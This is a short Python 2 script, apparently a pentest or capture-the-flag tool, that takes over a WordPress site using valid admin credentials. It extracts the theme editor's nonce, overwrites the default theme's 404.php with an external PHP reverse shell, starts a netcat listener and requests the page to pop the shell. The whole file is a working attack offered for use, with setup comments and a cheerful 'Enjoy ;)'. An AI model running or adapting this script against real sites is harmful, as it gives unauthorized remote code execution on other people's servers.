#!/usr/bin/env python

# Upload PHP reverse shell to WordPress with valid credentials.

import requests, sys, re, thread, os

class GimmeShell(object):
    # setup external payload (i.e. php-reverse-shell.php) with IP/port.
    # setup IP in each session.get/session.post + self.url 
    # and execute with "python wordy.py <lport>"
    def __init__(self, portnum):
	self.portnum = portnum
	self._login()
	self._dropper()

    def _login(self):
	print "[*] Attempting Login."
	# add valid username in log value and pass in pwd value
        self.data = {"log":"","pwd":"","wp-submit":"Log In"}
        self.session = requests.session()
        self.response = self.session.post('http:///wp/wp-login.php', self.data, allow_redirects=True)
        if self.response.status_code == 200:
	    next
	else:
	    print "[-] Login Failed"
	    sys.exit(0)
        if 'wordpress_logged_in' in str(self.session.cookies.keys()):
	    print "[+] Login Successful!"
	print "\n[*] DETAILS:"
	for i in self.session.cookies.keys():
	    print "[+] %s" % (i)

    def _dropper(self):
	self.url = 'http:///wp/wp-admin/theme-editor.php'
	self.nr = self.session.get('http:///wp/wp-admin/')
	self.nr2 = self.session.get('http:///wp/wp-admin/theme-editor.php?file=/themes/default/404.php&theme=WordPress+Default')
	print "\n[*] successfully visited theme-editor.php: %s\n" % (self.nr2.status_code)
	# extract nonce to add to POST request.
	print "\n[*] Trying to find nonce.."
	self.nonce_extract = re.search('_wpnonce\"\svalue=\".*?\"', self.nr2.text)
	if self.nonce_extract:
    	    self.nonce_extract_ = self.nonce_extract.group()
    	    self.value = re.search('value=\"\S+\"', self.nonce_extract_)
	else:
	    print "[-] Nonce couldn't be extracted :("
	    sys.exit(0)

    	if self.value:
            self.nonce = self.value.group()[7:17]
	    print "[+] %s" % (self.nonce)
	# change port value in external file 
	self.portchangecmd = "sed -i -e 's/\$port = [[:digit:]]*;/\$port = " + str(self.portnum) + ";/g' php-reverse-shell.php"
	os.system(self.portchangecmd)
	print "[*] Generating payload..."
	self.fileread = open('php-reverse-shell.php').read()	
	self.data2 = {'_wpnonce' : self.nonce,
		      '_wp_http_referer' : '/wp/wp-admin/theme-editor.php?file=/themes/default/404.php',
		      'theme' : 'WordPress Default',
		      'newcontent' : self.fileread,
		      'action' : 'update',
		      'file' : '/themes/default/404.php',
		      'submit' : 'Update File'
		     }
	self.cmd = '/bin/nc -lvp ' + str(self.portnum)
	self.pdropper = self.session.post(self.url, data=self.data2)
	thread.start_new_thread(os.system,(self.cmd,))
	print "\n[+] Executing reverse shell. Enjoy ;)\n"
	self.popshell = self.session.get('http:///wp/wp-content/themes/default/404.php')
	
def main(): 
    GimmeShell(sys.argv[1])

if __name__ == "__main__" :
    main()
